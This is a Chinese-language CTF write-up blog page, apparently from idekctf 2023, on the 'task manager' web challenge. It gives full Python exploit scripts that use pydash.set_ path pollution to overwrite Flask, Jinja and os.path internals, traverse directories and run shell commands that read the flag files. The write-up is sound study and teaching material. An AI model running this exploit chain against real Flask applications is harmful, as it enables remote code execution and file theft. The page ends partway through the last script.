@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>idekctf 2023 wp - kdxcxs&#39; blog</title><meta name="Description" content=""><meta property="og:title" content="idekctf 2023 wp" />
+<meta property="og:description" content="因为放假了时间多了起来，难得专注的跟 r3kapig 的师傅们一起打了个比赛，最后拿到了第二，不少题目都很有意思，复盘记录一下。 web task manager 题目有点原型链污染的味" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-17T12:46:26+08:00" />
+<meta property="article:modified_time" content="2023-01-17T12:46:26+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="idekctf 2023 wp"/>
+<meta name="twitter:description" content="因为放假了时间多了起来，难得专注的跟 r3kapig 的师傅们一起打了个比赛，最后拿到了第二，不少题目都很有意思，复盘记录一下。 web task manager 题目有点原型链污染的味"/>
+<meta name="application-name" content="kdxcxs&#39; blog">
+<meta name="apple-mobile-web-app-title" content="kdxcxs&#39; blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.kdxcxs.com:4433/posts/wp/idekctf-2023-wp/" /><link rel="prev" href="https://blog.kdxcxs.com:4433/posts/wp/hack.lu-2022-htpl-wp/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "idekctf 2023 wp",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.kdxcxs.com:4433\/posts\/wp\/idekctf-2023-wp\/"
+        },"genre": "posts","keywords": "ctf, wp","wordcount":  2574 ,
+        "url": "https:\/\/blog.kdxcxs.com:4433\/posts\/wp\/idekctf-2023-wp\/","datePublished": "2023-01-17T12:46:26+08:00","dateModified": "2023-01-17T12:46:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "kdxcxs"},"author": {
+                "@type": "Person",
+                "name": "kdxcxs"
+            },"description": ""
+    }
+    </script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="kdxcxs&#39; blog">kdxcxs&#39; blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="kdxcxs&#39; blog">kdxcxs&#39; blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">idekctf 2023 wp</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>kdxcxs</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-01-17">2023-01-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2574 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;<span id="busuanzi_container_page_pv">
+                    <i class="far fa-eye fa-fw"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;次阅读
+                </span>
+            </div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#task-manager">task manager</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">misc</a>
+      <ul>
+        <li><a href="#phpfun">PHPFu&hellip;n:</a></li>
+        <li><a href="#niki">Niki:</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>因为放假了时间多了起来，难得专注的跟 r3kapig 的师傅们一起打了个比赛，最后拿到了第二，不少题目都很有意思，复盘记录一下。</p>
+<h2 id="web">web</h2>
+<h3 id="task-manager">task manager</h3>
+<p>题目有点原型链污染的味道，也可以说是借鉴了pyjail的一些思路，很有意思的一道题目。</p>
+<p>作者提供了对于 <code>pydash.set_</code> 的封装，可以通过变量路径设置值，类似一个高级版的 <code>setattr</code>。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">({</span><span class="s2">&#34;A&#34;</span><span class="p">:{</span><span class="s2">&#34;B&#34;</span><span class="p">:</span><span class="s2">&#34;C&#34;</span><span class="p">}},</span> <span class="s2">&#34;A.B&#34;</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;B&#39;</span><span class="p">:</span> <span class="s1">&#39;D&#39;</span><span class="p">}}</span>
+</span></span></code></pre></div><h4 id="寻找访问-app-的方法">寻找访问 app 的方法</h4>
+<p>在 <code>taskmanager.py</code> 里面调用 <code>pydash.set_()</code> 可以通过实例化的 <code>TaskManager</code> 对象利用特殊属性实现对 <code>app</code> 对象的修改：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TaskManager</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.xxx&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;xxx&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></div><h4 id="将-eval-加入模板全局变量">将 eval 加入模板全局变量</h4>
+<p>然后再回来看 <code>app.py</code> ，可以发现一段很奇怪的代码：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hxz3zo0taq.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczMTMwMWMyZTY2OGIyNzg1Yzg2NmY0MzdiODBjZjFfb3hoOVltcEJiT0Y2Zkdsbm1CODF1b2JaR0tSNFRRZjNfVG9rZW46Ym94Y25tTTB0dldDSGdnNVIwcUg2SkVtd21ZXzE2NzQyNzg1MzE6MTY3NDI4MjEzMV9WNA"
+        data-srcset="https://hxz3zo0taq.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczMTMwMWMyZTY2OGIyNzg1Yzg2NmY0MzdiODBjZjFfb3hoOVltcEJiT0Y2Zkdsbm1CODF1b2JaR0tSNFRRZjNfVG9rZW46Ym94Y25tTTB0dldDSGdnNVIwcUg2SkVtd21ZXzE2NzQyNzg1MzE6MTY3NDI4MjEzMV9WNA, https://hxz3zo0taq.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczMTMwMWMyZTY2OGIyNzg1Yzg2NmY0MzdiODBjZjFfb3hoOVltcEJiT0Y2Zkdsbm1CODF1b2JaR0tSNFRRZjNfVG9rZW46Ym94Y25tTTB0dldDSGdnNVIwcUg2SkVtd21ZXzE2NzQyNzg1MzE6MTY3NDI4MjEzMV9WNA 1.5x, https://hxz3zo0taq.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczMTMwMWMyZTY2OGIyNzg1Yzg2NmY0MzdiODBjZjFfb3hoOVltcEJiT0Y2Zkdsbm1CODF1b2JaR0tSNFRRZjNfVG9rZW46Ym94Y25tTTB0dldDSGdnNVIwcUg2SkVtd21ZXzE2NzQyNzg1MzE6MTY3NDI4MjEzMV9WNA 2x"
+        data-sizes="auto"
+        alt="https://hxz3zo0taq.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczMTMwMWMyZTY2OGIyNzg1Yzg2NmY0MzdiODBjZjFfb3hoOVltcEJiT0Y2Zkdsbm1CODF1b2JaR0tSNFRRZjNfVG9rZW46Ym94Y25tTTB0dldDSGdnNVIwcUg2SkVtd21ZXzE2NzQyNzg1MzE6MTY3NDI4MjEzMV9WNA"
+        title="https://hxz3zo0taq.feishu.cn/space/api/box/stream/download/asynccode/?code=YjczMTMwMWMyZTY2OGIyNzg1Yzg2NmY0MzdiODBjZjFfb3hoOVltcEJiT0Y2Zkdsbm1CODF1b2JaR0tSNFRRZjNfVG9rZW46Ym94Y25tTTB0dldDSGdnNVIwcUg2SkVtd21ZXzE2NzQyNzg1MzE6MTY3NDI4MjEzMV9WNA" /></p>
+<p>既然 <code>app</code> 已经可控了，如果能够实现 <code>before_first_request</code> 的重复调用那么就可以在模板中实现任意代码执行了，经过一些寻找发现可以通过将 <code>app._got_first_request</code> 设置为 <code>False</code> 实现。</p>
+<h4 id="设法调用-eval">设法调用 eval</h4>
+<p>接下来就是寻找方法对已经放入模板全局变量的 <code>eval</code> 函数进行调用，而 <code>add_template_global</code> 函数是通过 <code>__name__</code> 来确定变量名字的，但是 builtin 函数的 <code>__name__</code> 是只读的，所以没有办法用来改个名字放进去，只有找现有文件中存在 eval 的来当作模板。在题目中只有 <code>app.py</code> 出现了 eval ，可以尝试利用。</p>
+<p>这里使用的方法是对 <code>app.jinja_env</code> 的 <code>variable_start_string</code> 和 <code>variable_end_string</code> 进行替换，原本 jinja 是通过识别 <code>{{.*}}</code> 来识别模板中的变量的，但是我们可以通过修改这两个值来更改 jinja 识别变量的方式，从而拼接出一个rce。</p>
+<h4 id="绕过-jinja-的目录穿越检查实现任意文件渲染">绕过 jinja 的目录穿越检查实现任意文件渲染</h4>
+<p>下面一个问题是现在只能够对 <code>templates</code> 下面的文件进行渲染，但是这里面的 html 很明显是用不了的，所以要想办法让他可以渲染任意文件，在 jinja 源码(<a href="https://github.com/pallets/jinja/blob/36b601f24b30a91fe2fdc857116382bcb7655466/src/jinja2/loaders.py#L24-L38" target="_blank" rel="noopener noreffer">https://github.com/pallets/jinja/blob/36b601f24b30a91fe2fdc857116382bcb7655466/src/jinja2/loaders.py#L24-L38</a>) 可以看到是通过 <code>os.path.pardir</code> 来对目录穿越进行了保护，但是我们可以通过修改 <code>pardir</code> 的值来绕过。</p>
+<p>最后在对 <code>app.py</code> 进行利用的时候发现虽然出现了 <code>eval</code> ，但是并没有 <code>eval(.*)</code> 的形式出现，尝试通过修改 <code>app.jinja_env</code> 的 <code>comment_start_string</code> 和 <code>comment_end_string</code> 来让 jinja 把文件的一部分当作注释删掉来凑成一个 <code>eval(.*)</code> 的形式，但是 jinja 解析时会报错，后来发现 <code>{{ eval{# #}(.*) }}</code> 这种中间有注释的模板变量本来就不能正常解析，但是现在既然可以渲染任意文件了，所以可以尝试在 python 库里面寻找出现 <code>eval(.*)</code> 的文件，最后找到了 <code>turtle.py</code>。</p>
+<h4 id="exp">exp</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:1337&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span>      <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/api/manage_tasks&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">exp_url</span>  <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/../../usr/local/lib/python3.8/turtle.py&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span>      <span class="o">=</span> <span class="s1">&#39;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># add eval to template globals</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">app</span><span class="si">}</span><span class="s2">.env&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;yolo&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">app</span><span class="si">}</span><span class="s2">._got_first_request&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># bypass jinja directory traversal check</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="s2">&#34;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;foobar&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># change jinja_env</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">app</span><span class="si">}</span><span class="s2">.jinja_env.variable_start_string&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;&#34;&#39;&#34;&#34;&#39;]:</span><span class="se">\n</span><span class="s2">            value = &#34;&#34;&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">app</span><span class="si">}</span><span class="s2">.jinja_env.variable_end_string&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># add global vars</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">app</span><span class="si">}</span><span class="s2">.jinja_env.globals.value&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag-*.txt&#39;).read()&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">exp_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">prepare</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">exp_url</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;idek{.*}&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="非预期">非预期</h4>
+<p>由于作者把 flag 写在 Dockerfile 里面了，并且在构建容器的时候是通过 <code>RUN echo &quot;idek{[REDACTED]}&quot; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt</code> 写的 flag 通过<code>COPY . .</code> 添加的题目代码，这就意味着 Dockerfile 本身也被复制进了容器，所以在实现 LFI 之后就可以直接读取 Dockerfile 就可以拿到 flag 了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:1337&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span>      <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/api/manage_tasks&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">exp_url</span>  <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/../Dockerfile&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># bypass jinja directory traversal check</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="s2">&#34;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;foobar&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">exp_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">prepare</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">exp_url</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;idek{.*}&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="通过-jinja2runtimeexported-实现-rce">通过 <code>jinja2.runtime.exported</code> 实现 rce</h4>
+<blockquote>
+<p><a href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager" target="_blank" rel="noopener noreffer">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a></p>
+</blockquote>
+<p>通过 jinja 源码(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1208" target="_blank" rel="noopener noreffer">https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1208</a>) 可以发现模板的生成其实是调用了 <code>environment.from_string</code>，而在 <code>from_string</code> 函数中又调用了(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1105" target="_blank" rel="noopener noreffer">https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1105</a>) <code>environment.compile</code>，并且对 <code>compile</code> 会返回一个 <code>code</code> 对象，后续会被 exec(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1222" target="_blank" rel="noopener noreffer">https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1222</a>)，如果我们能够控制这里 exec 的内容那么就可以实现 rce。</p>
+<p>经过简单的调试可以 在这里(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/compiler.py#L839" target="_blank" rel="noopener noreffer">https://github.com/pallets/jinja/blob/main/src/jinja2/compiler.py#L839</a>) 发现在生成代码的时候有一个可控变量 <code>exported_names</code>，他是 runtime(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/runtime.py#L45" target="_blank" rel="noopener noreffer">https://github.com/pallets/jinja/blob/main/src/jinja2/runtime.py#L45</a>) 里面的一个数组，所以我们完全可以通过 <code>pydash.set_()</code> 来进行覆盖，从而达到 rce。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:1337&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span>      <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/api/manage_tasks&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/../../tmp/flag&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;*
+</span></span></span><span class="line"><span class="cl"><span class="s1">__import__(&#39;os&#39;).system(&#39;cp /flag* /tmp/flag&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">#&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># bypass jinja directory traversal check</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="s2">&#34;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.os.path.pardir&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;foobar&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># replace exported to prepare rce</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;task&#34;</span><span class="p">:</span> <span class="s2">&#34;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0&#34;</span><span class="p">,</span> <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># trigger rce</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s1">/home.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># get flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">flag_url</span><span class="p">)</span>
